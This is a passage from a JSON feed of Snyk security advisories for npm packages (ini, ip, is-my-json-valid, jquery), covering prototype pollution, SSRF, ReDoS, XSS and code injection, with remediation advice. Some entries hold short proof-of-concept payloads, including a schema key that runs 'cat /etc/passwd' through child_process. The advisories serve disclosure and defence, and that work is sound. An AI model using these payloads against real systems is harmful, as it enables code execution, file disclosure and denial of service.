Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `ini` to version 1.3.6 or higher.\n## References\n- [Eugene Lim - Research Blog Post](https://medium.com/csg-govtech/supply-chain-pollution-discovering-a-16-million-download-week-node-js-2fa4d2c27cf7)\n- [GitHub Commit](https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1)\n",
        "created_at": "2020-12-08T15:34:07Z",
        "updated_at": "2024-03-11T09:53:56Z",
        "problems": [
          {
            "id": "CVE-2020-7788",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.3.6 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.3.6"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.3.6"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-12-08T13:02:04Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-12-10T18:08:38Z",
            "references": [
              {
                "url": "https://medium.com/csg-govtech/supply-chain-pollution-discovering-a-16-million-download-week-node-js-2fa4d2c27cf7",
                "title": "Eugene Lim - Research Blog Post"
              },
              {
                "url": "https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-IP-6240864",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Server-side Request Forgery (SSRF)",
        "description": "## Overview\n[ip](https://github.com/indutny/node-ip) is a Node library.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF) via the `isPublic` function, by failing to identify hex-encoded `0x7f.1` as equivalent to the private addess `127.0.0.1`. An attacker can expose sensitive information, interact with internal services, or exploit other vulnerabilities within the network by exploiting this vulnerability.\n## PoC\n```js\r\nvar ip = require('ip');\r\n\r\nconsole.log(ip.isPublic(\"0x7f.1\"));\r\n//This returns true. It should be false because 0x7f.1 == 127.0.0.1 == 0177.1\r\n```\n## Remediation\nUpgrade `ip` to version 1.1.9, 2.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/indutny/node-ip/commit/32f468f1245574785ec080705737a579be1223aa)\n- [GitHub Commit](https://github.com/indutny/node-ip/commit/6a3ada9b471b09d5f0f5be264911ab564bf67894)\n- [GitHub Issue](https://github.com/indutny/node-ip/issues/128)\n- [GitHub PR](https://github.com/indutny/node-ip/pull/138)\n- [Vulnerability Report](https://cosmosofcyberspace.github.io/npm_ip_cve/npm_ip_cve.html)\n- [Vulnerable Code](https://github.com/indutny/node-ip/blob/v1.1.8/lib/ip.js#L327)\n",
        "created_at": "2024-02-09T14:56:36Z",
        "updated_at": "2024-07-12T15:25:03Z",
        "problems": [
          {
            "id": "CVE-2023-42282",
            "source": "CVE"
          },
          {
            "id": "CWE-918",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.1.9 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.1.9"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.1.9,>=2.0.0 <2.0.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.6,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2024-02-08T17:45:02Z",
            "exploit": "Proof of Concept",
            "publication_time": "2024-02-11T07:37:52Z",
            "references": [
              {
                "url": "https://github.com/indutny/node-ip/commit/32f468f1245574785ec080705737a579be1223aa",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/indutny/node-ip/commit/6a3ada9b471b09d5f0f5be264911ab564bf67894",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/indutny/node-ip/issues/128",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/indutny/node-ip/pull/138",
                "title": "GitHub PR"
              },
              {
                "url": "https://cosmosofcyberspace.github.io/npm_ip_cve/npm_ip_cve.html",
                "title": "Vulnerability Report"
              },
              {
                "url": "https://github.com/indutny/node-ip/blob/v1.1.8/lib/ip.js%23L327",
                "title": "Vulnerable Code"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-IP-7148531",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Server-Side Request Forgery (SSRF)",
        "description": "## Overview\n[ip](https://github.com/indutny/node-ip) is a Node library.\n\nAffected versions of this package are vulnerable to Server-Side Request Forgery (SSRF) via the `isPublic` function, which identifies some private IP addresses as public addresses due to improper parsing of the input.\r\nAn attacker can manipulate a system that uses `isLoopback()`, `isPrivate()` and `isPublic` functions to guard outgoing network requests to treat certain IP addresses as globally routable by supplying specially crafted IP addresses.\r\n\r\n**Note**\r\n\r\nThis vulnerability derived from an incomplete fix for [CVE-2023-42282](https://security.snyk.io/vuln/SNYK-JS-IP-6240864)\n## Remediation\nThere is no fixed version for `ip`.\n\n## References\n- [GitHub Commit](https://github.com/indutny/node-ip/pull/144/commits/934fadee0080b9d201df95a3f7eead6c46e94017)\n- [GitHub Commit](https://github.com/indutny/node-ip/pull/144/commits/94f82bd4f2bace0c228bbbfe70073a71536fcbdf)\n- [GitHub Commit](https://github.com/indutny/node-ip/pull/144/commits/aeea96e445164c72607a9043e37bcc7bc8786ec9)\n- [GitHub Issue](https://github.com/indutny/node-ip/issues/150)\n- [GitHub PR](https://github.com/indutny/node-ip/pull/143)\n- [GitHub PR](https://github.com/indutny/node-ip/pull/144)\n",
        "created_at": "2024-05-28T07:31:24Z",
        "updated_at": "2024-06-06T12:41:40Z",
        "problems": [
          {
            "id": "CVE-2024-29415",
            "source": "CVE"
          },
          {
            "id": "CWE-918",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": null,
            "representation": [
              {
                "resource_path": "*"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2024-05-27T20:40:21Z",
            "exploit": "Proof of Concept",
            "publication_time": "2024-05-28T08:06:24Z",
            "references": [
              {
                "url": "https://github.com/indutny/node-ip/pull/144/commits/934fadee0080b9d201df95a3f7eead6c46e94017",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/indutny/node-ip/pull/144/commits/94f82bd4f2bace0c228bbbfe70073a71536fcbdf",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/indutny/node-ip/pull/144/commits/aeea96e445164c72607a9043e37bcc7bc8786ec9",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/indutny/node-ip/issues/150",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/indutny/node-ip/pull/143",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/indutny/node-ip/pull/144",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-ISMYJSONVALID-597165",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[is-my-json-valid](https://github.com/mafintosh/is-my-json-valid) is a JSONSchema / orderly validator that uses code generation to be extremely fast.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `style` format. \r\n\r\n##PoC\r\n```\r\nconst imjv = require('is-my-json-valid')\r\nconst validate = imjv({ maxLength: 100, format: 'style' })\r\nconsole.log(validate(' '.repeat(1e4)))\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `is-my-json-valid` to version 2.20.2 or higher.\n## References\n- [GitHub Commit](https://github.com/mafintosh/is-my-json-valid/commit/c3fc04fc455d40e9b29537f8e2c73a28ce106edb)\n- [HackerOne Report](https://hackerone.com/reports/909757)\n",
        "created_at": "2020-08-02T12:09:52Z",
        "updated_at": "2024-03-06T13:59:01Z",
        "problems": [
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.20.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.20.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.20.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-07-31T17:13:38Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-08-02T15:04:47Z",
            "references": [
              {
                "url": "https://github.com/mafintosh/is-my-json-valid/commit/c3fc04fc455d40e9b29537f8e2c73a28ce106edb",
                "title": "GitHub Commit"
              },
              {
                "url": "https://hackerone.com/reports/909757",
                "title": "HackerOne Report"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-ISMYJSONVALID-597167",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Arbitrary Code Execution",
        "description": "## Overview\n[is-my-json-valid](https://github.com/mafintosh/is-my-json-valid) is a JSONSchema / orderly validator that uses code generation to be extremely fast.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution via the `formatName` function.\r\n\r\n##PoC\r\n```const validator = require('is-my-json-valid')\r\nconst schema = {\r\n  type: 'object',\r\n  properties: {\r\n    'x[console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`))]': {\r\n      required: true,\r\n      type:'string'\r\n    }\r\n  },\r\n}\r\nvar validate = validator(schema);\r\nvalidate({})\r\n```\n## Remediation\nUpgrade `is-my-json-valid` to version 2.20.3 or higher.\n## References\n- [GitHub Commit](https://github.com/mafintosh/is-my-json-valid/commit/3419563687df463b4ca709a2b46be8e15d6a2b3d)\n- [HackerOne Report](https://hackerone.com/reports/894308)\n",
        "created_at": "2020-08-02T12:14:47Z",
        "updated_at": "2024-03-06T13:59:01Z",
        "problems": [
          {
            "id": "CWE-94",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.20.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.20.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.20.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-07-31T17:14:47Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-08-02T15:04:45Z",
            "references": [
              {
                "url": "https://github.com/mafintosh/is-my-json-valid/commit/3419563687df463b4ca709a2b46be8e15d6a2b3d",
                "title": "GitHub Commit"
              },
              {
                "url": "https://hackerone.com/reports/894308",
                "title": "HackerOne Report"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-JQUERY-174006",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The `extend` function can be tricked into modifying the prototype of `Object` when the attacker controls part of the structure passed to this function. This can let an attacker add or modify an existing property that will then exist on all objects.\r\n\r\n**Note:** CVE-2019-5428 is a duplicate of CVE-2019-11358\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `jquery` to version 3.4.0 or higher.\n## References\n- [GitHub Commit](https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b)\n- [GitHub PR](https://github.com/jquery/jquery/pull/4333)\n- [Hackerone Report](https://hackerone.com/reports/454365)\n- [Snyk Blog](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/)\n- [Third-Party Backported Patches Repo](https://github.com/DanielRuf/snyk-js-jquery-174006)\n",
        "created_at": "2019-03-27T08:43:07Z",
        "updated_at": "2024-06-12T07:18:46Z",
        "problems": [
          {
            "id": "CVE-2019-11358",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.4.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.4.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.4.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.6,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2019-03-26T08:40:15Z",
            "exploit": "Proof of Concept",
            "publication_time": "2019-03-27T08:40:08Z",
            "references": [
              {
                "url": "https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/jquery/jquery/pull/4333",
                "title": "GitHub PR"
              },
              {
                "url": "https://hackerone.com/reports/454365",
                "title": "Hackerone Report"
              },
              {
                "url": "https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/",
                "title": "Snyk Blog"
              },
              {
                "url": "https://github.com/DanielRuf/snyk-js-jquery-174006",
                "title": "Third-Party Backported Patches Repo"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-JQUERY-565129",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Cross-site Scripting (XSS)",
        "description": "## Overview\n\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\nPassing HTML containing `<option>` elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html()`, `.append()`, and others) may execute untrusted code.\r\n\r\n**NOTE:** This vulnerability was also assigned CVE-2020-23064.\n\n## Details\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\n\nUpgrade `jquery` to version 3.5.0 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)\n\n- [PoC](https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html)\n\n- [Release Notes](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n\n- [Security Blog](https://masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html)\n\n- [Exploit DB](https://www.exploit-db.com/exploits/49767)\n",
        "created_at": "2020-04-13T07:16:49Z",
        "updated_at": "2024-06-03T08:53:11Z",
        "problems": [
          {
            "id": "CVE-2020-11023",
            "source": "CVE"
          },
          {
            "id": "CWE-79",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.5.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.5.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=1.5.1 <3.5.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L/E:F/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2020-04-10T00:00:00Z",
            "exploit": "Functional",
            "publication_time": "2020-04-13T15:33:49Z",
            "references": [
              {
                "url": "https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77",
                "title": "GitHub Commit"
              },
              {
                "url": "https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html",
                "title": "PoC"
              },
              {
                "url": "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/",
                "title": "Release Notes"
              },
              {
                "url": "https://masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html",
                "title": "Security Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-JQUERY-567880",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Cross-site Scripting (XSS)",
        "description": "## Overview\n\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS).\nPassing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html(), .append()`, and others) may execute untrusted code.\n\n\n## Details:\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to 